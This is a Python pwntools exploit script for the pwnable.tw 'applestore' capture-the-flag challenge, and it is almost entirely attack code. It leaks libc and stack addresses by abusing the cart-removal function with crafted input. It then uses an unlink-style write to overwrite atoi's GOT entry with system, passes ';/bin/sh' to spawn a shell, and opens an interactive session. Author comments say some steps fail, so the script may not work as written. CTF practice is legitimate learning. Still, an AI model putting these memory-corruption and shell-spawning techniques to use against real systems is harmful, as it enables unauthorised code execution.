from pwn import *

#r = process("./applestore")
r = remote('chall.pwnable.tw',10104)

libc = ELF('./libc_32.so.6')
context.arch = "i386"
context.log_level = "error"

printf_got = 0x804b010
atoi_got = 0x0804b040
def add(devno):
	r.sendlineafter(">",str(2))
	r.sendlineafter("Device Number> ",str(devno))
	print(r.recvline())
	print(r.recvline())

def remove(devno, no):
	r.sendlineafter(">",str(3))
	#if(no == 0):
		#gdb.attach(r,'b * 0x080489da')
	r.sendlineafter("Item Number> ", devno)

def checkout(m):
	r.sendlineafter(">",str(5))
	r.sendlineafter("Let me check your cart. ok? (y/n) >",m)


def exit():
	r.sendlineafter(">",str(6))

#bypass checkout
for i in range(20):
	add(2)
for i in range(6):
	add(1)

#getting the libc leak
checkout("y")
remove(str(27)+ p32(printf_got),1)
#print r.recvline()
leak = u32((r.recvline().strip()[10:-25])[:4])
print(hex(leak))
libc_base = leak - libc.symbols['printf']
system = libc_base + libc.symbols['system']
#print(hex(libc_base))

#getting the stack leak
environ = libc_base + libc.symbols['environ']
remove(str(27)+p32(environ),2)
#print(r.recvline())
leak1 = u32((r.recvline().strip()[10:-25])[:4])
print(hex(leak1))

#unable to do the unlink properly
#can't write on the libc addr 2nd step fails
#doing the unlink
ebp = leak1 - 0x104 
payload = p32(0)*2+p32(atoi_got+0x22)+p32(ebp-0x8)
remove(str(27)+payload,9)

payload = p32(system)
#gdb.attach(r,'b * 0x8048c0b')
r.sendlineafter('>',payload+";/bin/sh")






#0x1b3dbc
#use delete to get leaks and overwrite...0xf7718dbc
r.interactive()